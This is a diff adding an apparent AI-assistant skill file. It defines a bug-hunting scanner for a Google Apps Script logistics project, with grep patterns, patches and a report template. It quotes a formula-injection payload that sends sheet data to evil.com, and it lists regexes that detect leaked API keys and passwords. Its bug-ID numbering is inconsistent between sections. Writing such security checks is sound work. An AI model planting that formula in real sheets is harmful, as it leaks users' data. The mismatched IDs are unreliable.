@@ -1,0 +1,598 @@
+# BUGHUNT Scanner
+
+LMDS Bug Hunter — Critical + Performance Scanner
+Status: LMDS V6.0.046 — 18 audit cycles, 116 issues fixed
+Purpose: Catch regressions to known bugs and surface new critical/performance issues before they hit production.
+Severity tiers: P0 (data corruption / security) | P1 (correctness / stability) | P2 (performance / UX) | P3 (cleanup)
+
+This skill is the investigation layer for the architecture in lmds-architect. It works best when chained after lmds-code-reviewer — first enforce the laws, then hunt for what's still hiding.
+
+How to Use This Skill
+When invoked (or user says /BUGHUNT, [CMD: BUGHUNT], "find bugs", "scan for issues"):
+
+1.
+Static scan — run the grep/regex patterns in § 1 (Critical), § 2 (Performance), § 3 (GAS-specific) below against src/**/*.gs.
+2.
+Historical check — search the source for the known bug patterns in § 4 (CRIT-001 to CRIT-012 + cache antipatterns). Any match = regression.
+3.
+Output — a sorted report with: ID | Severity | File:Line | Pattern | Why it's bad | Patch
+If user pastes an error message or a specific failure, jump to § 5 — Symptom → Root cause mapping.
+
+If the user provides code, do a single-pass grep + manual review of suspicious blocks (long loops, lock acquisition, cache writes, setValues calls, error catches).
+
+1. P0 — Critical Patterns (data corruption / security)
+1.1 Scientific notation on invoice numbers
+Pattern: any comparison of invoice_no without normalizeInvoiceNo().
+
+bash
+
+Copy
+grep -nE 'invoice_no|invoiceNo|INVOICE_NO|\.invoice' src/**/*.gs
+Why bad: Google Sheets auto-formats long numbers (≥12 digits) as scientific notation (2.02407E+12). Direct comparison fails silently. Bug CRIT-001 in the original audit.
+
+Patch:
+
+js
+
+Copy
+// ❌ BEFORE
+
+if (row[FACT_IDX.INVOICE_NO] === searchInvoice) { ... }
+
+
+// ✅ AFTER
+
+if (normalizeInvoiceNo(row[FACT_IDX.INVOICE_NO]) === normalizeInvoiceNo(searchInvoice)) { ... }
+Severity: P0 (silent data loss in dedup)
+
+1.2 Resolved Lat/Lng initialized to 0 instead of null
+Pattern: resolvedLat: 0, resolvedLng: 0 in initialization.
+
+bash
+
+Copy
+grep -nE 'resolvedLat.*0|resolvedLng.*0|resolved_lat.*0|resolved_lng.*0' src/**/*.gs
+Why bad: Match engine Rule 1 INVALID_LATLNG checks for (lat===0 && lng===0). If we initialize to 0, every new record is flagged as invalid. Bug CRIT-002.
+
+Patch:
+
+js
+
+Copy
+// ❌ BEFORE
+
+const ctx = { resolvedLat: 0, resolvedLng: 0, ... };
+
+
+// ✅ AFTER
+
+const ctx = { resolvedLat: null, resolvedLng: null, ... };
+Severity: P0
+
+1.3 Upsert returns nothing (silent data loss)
+Pattern: upsertFactDelivery(...) not capturing/using return value.
+
+bash
+
+Copy
+grep -nE 'upsertFactDelivery' src/**/*.gs
+Why bad: If the upsert fails (row index out of bounds, lock contention), caller doesn't know. Bug CRIT-003. Always:
+
+js
+
+Copy
+const result = upsertFactDelivery_(fact);
+
+if (!result.success) logError('11_TransactionService', 'upsert failed', result.error);
+Severity: P0
+
+1.4 Race condition — no LockService
+Pattern: Any function that writes master sheets without LockService.getScriptLock().
+
+bash
+
+Copy
+# Functions that should hold a lock:
+
+grep -nE 'createPerson|createPlace|createGeoPoint|createDestination|createGlobalAlias|upsertFactDelivery|mergePersonRecords' src/**/*.gs
+
+# Then check each for `LockService` reference within the function
+Why bad: Two concurrent runs (e.g. auto-resume + manual run) can corrupt master data. Bug CRIT-004.
+
+Patch:
+
+js
+
+Copy
+function createPerson_(name, phone) {
+
+  const lock = LockService.getScriptLock();
+
+  if (!lock.tryLock(APP_CONST.LOCK_TIMEOUT_MS)) {
+
+    throw new Error('Could not acquire lock; another write in progress');
+
+  }
+
+  try {
+
+    // ... write logic ...
+
+  } finally {
+
+    lock.releaseLock();
+
+  }
+
+}
+Severity: P0
+
+1.5 Secret in code or cell
+Pattern: API key, cookie, password string literal.
+
+bash
+
+Copy
+grep -rnE 'AIza[A-Za-z0-9_-]{35}|AKIA[0-9A-Z]{16}|password\s*[:=]\s*["'\''][^"'\'']{6,}' src/**/*.gs
+
+grep -rnE 'cookie.*=.*[A-Za-z0-9]{40,}' src/**/*.gs
+Why bad: Bug SEC-001 / SEC-006. Secrets in Sheet cells are indexed by Google. Use PropertiesService.getScriptProperties().setProperty('GEMINI_API_KEY', ...) instead.
+
+Patch: move to ScriptProperties, reference via CONFIG.getGeminiApiKey().
+
+Severity: P0 (security)
+
+1.6 API key in URL query string
+Pattern: ?key=... or ?apiKey=... or &apikey=... in UrlFetchApp.fetch.
+
+bash
+
+Copy
+grep -nE 'fetch\([^)]*(\?|&)(api_?key|access_?token)=[^)]*\)' src/**/*.gs
+Why bad: URLs are logged in UrlFetchApp execution logs. Bug SEC-006. API keys must be in x-goog-api-key HTTP header.
+
+Patch:
+
+js
+
+Copy
+// ❌ BEFORE
+
+const res = UrlFetchApp.fetch(`https://maps.googleapis.com/maps/api/geocode/json?address=${addr}&key=${key}`);
+
+
+// ✅ AFTER
+
+const res = UrlFetchApp.fetch(`https://maps.googleapis.com/maps/api/geocode/json?address=${addr}`, {
+
+  headers: { 'x-goog-api-key': key },
+
+  muteHttpExceptions: false
+
+});
+Severity: P0
+
+1.7 Formula injection via Sheet write
+Pattern: writing user-provided string to a cell without escaping leading =, +, -, @.
+
+bash
+
+Copy
+grep -nE 'setValue\(|setValues\(' src/**/*.gs | grep -v "// safe"
+Why bad: A malicious =HYPERLINK("http://evil.com?steal="&A1, "click") can exfiltrate data. Bug CRIT-007.
+
+Patch:
+
+js
+
+Copy
+function sanitizeForSheet_(value) {
+
+  if (typeof value !== 'string') return value;
+
+  return /^[=+\-@]/.test(value) ? "'" + value : value;
+
+}
+
+// Then wrap every cell value: sanitizeForSheet_(row[col])
+Severity: P0
+
+1.8 PII written to log
+Pattern: console.log / logInfo / logError with email, phone, person name unredacted.
+
+bash
+
+Copy
+grep -nE 'logError\(|logInfo\(|console\.(log|warn|error)' src/**/*.gs
+Why bad: Bug SEC-004 / SEC-010. Logs persist in SYS_LOG and may be visible to other admins.
+
+Patch:
+
+js
+
+Copy
+// ❌ BEFORE
+
+logError('module', `Failed for ${person.email}`, e);
+
+
+// ✅ AFTER
+
+logError('module', `Failed for ${maskEmail_(person.email)}`, e);
+Severity: P0
+
+2. P1 — Correctness / Stability Patterns
+2.1 Cache > 100KB without chunking
+Pattern: CacheService.put(key, bigObject) where bigObject > 100KB.
+
+Detection: manually inspect any CacheService.getScriptCache().put(...) and trace the object size. Look for JSON.stringify of large arrays.
+
+Why bad: CacheService rejects values >100KB per key. Bug CRIT-008. Solution: saveChunkedCache_(key, arr, chunkSize=200) from 14_Utils.gs.
+
+Patch:
+
+js
+
+Copy
+// ❌ BEFORE
+
+CacheService.getScriptCache().put('ALL_PERSONS', JSON.stringify(allPersons), 21600);
+
+
+// ✅ AFTER
+
+saveChunkedCache_('ALL_PERSONS', allPersons, 200);
+Severity: P1
+
+2.2 Trigger ID not stored before deletion
+Pattern: ScriptApp.deleteTrigger(t) without prior PropertiesService.setProperty('TRIGGER_ID', t.getUniqueId()).
+
+Why bad: Bug CRIT-005. If you delete a user's trigger, they can't get it back. Hard rule 19.
+
+Patch:
+
+js
+
+Copy
+const triggers = ScriptApp.getProjectTriggers();
+
+const storedId = PropertiesService.getScriptProperties().getProperty('AUTO_RESUME_TRIGGER_ID');
+
+triggers.forEach(t => {
+
+  if (t.getHandlerFunction() === 'autoResume_' && t.getUniqueId() === storedId) {
+
+    ScriptApp.deleteTrigger(t);
+
+    PropertiesService.getScriptProperties().deleteProperty('AUTO_RESUME_TRIGGER_ID');
+
+  }
+
+});
+Severity: P1
+
+2.3 upsertFactDelivery without dedup check
+Pattern: Direct appendRow to FACT_DELIVERY without checking for existing invoice_no + shipment_no combination.
+
+Why bad: Duplicate processing. Bug discovered in audit round 6 (CACHE-FIX P0).
+
+Patch: always call upsertFactDelivery_(fact, { dedupBy: ['invoice_no', 'shipment_no'] }) which uses the FACT_IDX.INVOICE_NO index for lookup.
+
+Severity: P1
+
+2.4 Geo caching key too coarse
+Pattern: CacheService.put('GEOCODE_' + address, ...) (single address as key, fine) — but also CacheService.put('ALL_GEOS', ...) (one big key, can exceed 100KB).
+
+Why bad: Bug CRIT-008. Use chunked storage.
+
+Severity: P1
+
+2.5 Phantom dep — function called but not defined
+Pattern: Call site without definition.
+
+bash
+
+Copy
+# Extract all calls and grep for definition
+
+grep -nE '^\s*\w+[A-Z]\w*_\(' src/**/*.gs | awk -F: '{print $3}' | sort -u > /tmp/calls.txt
+
+grep -nhE '^function |^const \w+ = ' src/**/*.gs | sed -E 's/.*(function|const) (\w+).*/\2/' | sort -u > /tmp/defs.txt
+
+comm -23 /tmp/calls.txt /tmp/defs.txt
+Why bad: Code throws ReferenceError at runtime. Bug from the original 8 critical bugs (BUGHUNT round 1).
+
+Patch: define the missing function or fix the typo.
+
+Severity: P1
+
+2.6 Cache not invalidated after write
+Pattern: Write to master sheet, no invalidate*Cache_() call follows.
+
+Detection:
+
+bash
+
+Copy
+# For each function in 10_MatchEngine / 11_TransactionService / 12_ReviewService / 21_AliasService
+
+# check that the next 5 lines include a CacheService.remove or invalidate call
+Why bad: Stale data served. Hard rule 20.
+
+Patch: add the matching invalidate*Cache_() call after the write.
+
+Severity: P1
+
+2.7 Match decision doesn't consider negative samples
+Pattern: findPersonCandidates_(row) returns candidates but doesn't filter out pairs that are in SYS_NEGATIVE_SAMPLES.
+
+Why bad: Engine re-proposes rejected pairs.
+
+Patch: in 06_PersonService, after computing candidates:
+
+js
+
+Copy
+const negatives = loadNegativeSamples_(row[SHIP_TO_NAME]);
+
+const filtered = candidates.filter(c => !negatives.has(c.person_id + '|' + c.place_id));
+Severity: P1
+
+2.8 Time guard checks the wrong way
+Pattern:
+
+js
+
+Copy
+// ❌ WRONG
+
+if (new Date() - startTime < 300000) continue;
+This continues when time is still good — it should break and resume.
+
+Patch:
+
+js
+
+Copy
+// ✅ CORRECT
+
+if (hasTimePassed_(AI_CONFIG.TIME_LIMIT_MS)) {
+
+  saveCheckpoint_(currentIndex);
+
+  installAutoResume_();
+
+  return;
+
+}
+Severity: P1
+
+3. P2 — Performance Anti-Patterns
+3.1 getValue/setValue inside loop (Law 4)
+Already covered in code-reviewer. Performance impact: 100x slower.
+
+Pattern: for (...) sheet.getRange(...).getValue()
+
+Patch: batch with getValues() / setValues().
+
+Severity: P2 (Law 4 ERROR)
+
+3.2 Trigger fires on every cell change (onEdit)
+Pattern: onEdit(e) with logic that runs on every keystroke.
+
+Why bad: GAS may rate-limit. UX: cursor jumps.
+
+Patch: debounce — only act when e.range.columnStart === Q_REVIEW_IDX.DECISION + 1 (i.e. user changed the Decision dropdown).
+
+Severity: P2
+
+3.3 Repeated CacheService reads
+Pattern: same key read 10+ times in one function.
+
+Patch: read once, store in local const.
+
+Severity: P2
+
+3.4 getRange().getValues() on a 1-column range
+Pattern: sheet.getRange(2, 1, lastRow).getValues() instead of getRange(2, 1, lastRow, 1).getValues().
+
+Why bad: 2D array instead of 1D, extra flatten needed. Minor.
+
+Severity: P3 (cleanup)
+
+3.5 Maps API called per row without dedup
+Pattern: for (row of rows) geocodeAddress(row.address) — N API calls when N addresses may be duplicates.
+
+Why bad: Hits Maps API quota, slow. The 3-Layer cache is supposed to prevent this, but the first call still hits the API.
+
+Patch: group by normalized address, dedup, then map.
+
+Severity: P2
+
+3.6 Logger writes to sheet inside hot loop
+Pattern: logInfo(...) in a 1000-iteration loop.
+
+Why bad: Sheet writes are slow. 03_SetupSheets.gs has a flushLogBuffer_ for this reason.
+
+Patch: buffer logs, flush at end (or every 50 entries).
+
+Severity: P2
+
+4. Known Bug Patterns (Historical — Regression Watch)
+The original audit (cycles 1-5) found these. If you see them in new code, it's a regression:
+
+ID	Description	Anti-pattern	File pattern
+CRIT-001	resolvedLat/Lng initialized to 0	resolvedLat: 0	10_MatchEngine.gs
+CRIT-002	upsertFactDelivery doesn't return	function with no return	11_TransactionService.gs
+CRIT-003	Race condition in 10_MatchEngine	no LockService	10_MatchEngine.gs, 21_AliasService.gs
+CRIT-004	Phantom dep call	undefined function	anywhere
+CRIT-005	Trigger deleted by handler name only	deleteTrigger(t) without ID check	24_PipelineManager.gs
+CRIT-006	(was reassigned in V5.5)	—	—
+CRIT-007	Formula injection in cell write	raw setValue(userInput)	anywhere
+CRIT-008	Cache > 100KB	single put for big obj	anywhere
+CRIT-009	No invoice_no normalization	direct compare	11_TransactionService.gs
+CRIT-010	Silent fail (no try-catch)	no entry-point try	entry points
+CRIT-011	PII in log	raw email in logError	anywhere
+CRIT-012	fetchWithRetry_ logs response body	logError(..., res.getContentText())	14_Utils.gs
+Plus 8 anti-patterns from CACHE-FIX round 7:
+
+
+Stale data after master write (forgot invalidateAllGlobalCaches)
+
+Maps cache key collision (used raw address instead of normalized)
+
+Chunked cache reverse-lookup missing (need O(1) by id)
+
+Plus 3 anti-patterns from CACHE-CLEANUP round 8:
+
+
+Dead cache keys (write but never read)
+
+Redundant CacheService.removeAll([]) with empty array
+
+Unbounded RAM cache (no eviction)
+
+Plus 2 critical fixes round 12:
+
+
+Decision dropdown typo (off-by-one in index)
+
+Review post-processor infinite loop
+
+5. Symptom → Root Cause Mapping
+When the user reports a symptom, jump to the right root cause:
+
+Symptom	Most likely root cause	Diagnostic
+"Pipeline stops mid-way"	Time limit (6 min) reached, no checkpoint	Check LMDS_PIPELINE_CURSOR in ScriptProperties
+"Same invoice appears twice in FACT_DELIVERY"	upsertFactDelivery dedup check failed or skipped	Check normalizeInvoiceNo is called before compare
+"Match rate dropped suddenly"	Stale alias cache after createGlobalAlias	Run invalidateAllGlobalCaches()
+"Q_REVIEW keeps re-proposing the same wrong candidate"	Negative sample not loaded, or SYS_NEGATIVE_SAMPLES empty	Check loadNegativeSamples_()
+"WebApp shows white screen"	HtmlService.createHtmlOutputFromFile failed (missing .html) OR template error in include_	Check Apps Script Executions log for stack trace
+"Telegram alert not received"	TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID missing in ScriptProperties	Check 24_PipelineManager.gs logError output
+"Cookie expired"	SCG cookie TTL ~24h; needs re-grab from browser	Re-run "🔐 ตั้งค่า SCG Cookie" menu
+"Geo result is null"	Either Maps API quota exhausted OR no internet OR address couldn't be parsed	Check geocodeAddress_ return, check Cloud Console quota
+"Permission denied"	Email not in LMDS_ADMINS ScriptProperty	Add to ScriptProperties (comma-separated)
+"Script timeout exceeded"	6 min GAS hard limit hit; no checkpoint installed	Install via installAutoResume_()
+"AppScript out of memory"	Loading full sheet to RAM (getDataRange().getValues() on 50K+ rows)	Use chunked read: getRange(start, 1, 1000, lastCol).getValues()
+"Sheets showing #REF!"	Row deletion cascading (e.g. someone deleted a M_PERSON row that's FK'd)	Run MIGRATION_HybridAliasSystem() to repoint aliases
+"Webhook deploy failed: 403"	Apps Script API not enabled in Cloud project, or CLASPRC expired	Enable Apps Script API, refresh clasp login --relogin
+"Premature close on clasp push"	clasp + Node 22/24/25/26 incompatibility	Pin Node 20.x in 02-deploy.yml (already done)
+"DRIVER_VERIFIED columns not appearing"	Schema not yet migrated; V5.5.014 needs setupAllSheets() re-run	Run menu "🏗️ สร้างชีตทั้งหมด"
+6. Static Scan Cheat Sheet (one-liners)
+bash
+
+Copy
+# === P0 critical ===
+
+grep -rnE 'invoice_no\s*===' src/**/*.gs
+
+grep -rnE 'resolvedLat:\s*0|resolvedLng:\s*0' src/**/*.gs
+
+grep -rnE 'AIza[A-Za-z0-9_-]{35}' src/**/*.gs
+
+grep -rnE 'appendRow\(' src/**/*.gs
+
+grep -rnE 'console\.log.*@' src/**/*.gs
+
+grep -rnE '(\?|&)(api_?key|access_?token)=' src/**/*.gs
+
+
+# === P1 stability ===
+
+grep -rnE 'CacheService\..*put\(' src/**/*.gs
+
+grep -rnE 'ScriptApp\.deleteTrigger' src/**/*.gs
+
+grep -rnE 'setValue\(' src/**/*.gs
+
+
+# === P2 performance ===
+
+grep -rnE 'getValue\(\)' src/**/*.gs
+
+grep -rnE 'setValue\(' src/**/*.gs
+
+grep -rnE 'appendRow\(' src/**/*.gs
+
+
+# === Schema drift ===
+
+grep -rnE 'FACT_IDX\.\w+' src/**/*.gs | awk -F'FACT_IDX\\.' '{print $2}' | awk -F'[^A-Z_0-9]' '{print $1}' | sort -u > /tmp/used.txt
+
+grep -E 'FACT_IDX\.\w+' src/O_core_system/01_Config.gs | awk -F'FACT_IDX\\.' '{print $2}' | awk -F'[^A-Z_0-9]' '{print $1}' | sort -u > /tmp/defined.txt
+
+diff /tmp/used.txt /tmp/defined.txt
+
+
+# === Function collision ===
+
+grep -hE '^function \w+|^const \w+ = (function|\(.*\) =>|\(.*\) => {)' src/**/*.gs | sed -E 's/.*function (\w+).*/\1/; s/.*const (\w+).*/\1/' | sort | uniq -c | awk '$1 > 1'
+7. Output Template
+When the user asks for a bug hunt, output:
+
+markdown
+
+Copy
+# LMDS Bug Hunt Report — [scope]
+
+
+**Issues found:** N (P0: a, P1: b, P2: c, P3: d)
+
+**Compliance:** 16/16 Immutable Laws | 5/5 Hard Rules
+
+**Historical regressions:** [list of CRIT-XXX re-found, if any]
+
+
+## 🔴 P0 — Data Corruption / Security
+
+| ID | File:Line | Pattern | Patch |
+
+|----|-----------|---------|-------|
+
+
+## 🟠 P1 — Correctness / Stability
+
+| ID | File:Line | Pattern | Patch |
+
+|----|-----------|---------|-------|
+
+
+## 🟡 P2 — Performance
+
+| ID | File:Line | Pattern | Patch |
+
+|----|-----------|---------|-------|
+
+
+## 🟢 P3 — Cleanup
+
+| ID | File:Line | Pattern | Patch |
+
+|----|-----------|---------|-------|
+
+
+## ✅ Areas Clear
+
+- [list categories that passed]
+
+
+## Required Follow-ups
+
+- [ ] Fix all P0
+
+- [ ] Bump version after fix
+
+- [ ] Re-run `/PREDEPLOY`
+8. Integration with Other Skills
+
+lmds-architect — load first to know the structure.
+
+lmds-code-reviewer — chain to verify the patched code follows 16 Laws.
+
+lmds-refactor-advisor — if the fix requires restructuring (e.g. extract long function).
+
+lmds-predeploy-checker — run last before merge.
+
+lmds-security-auditor — for SEC-001→012 deep audit (P0 items often overlap).
+
+lmds-gas-best-practices — for § 3 performance patterns.
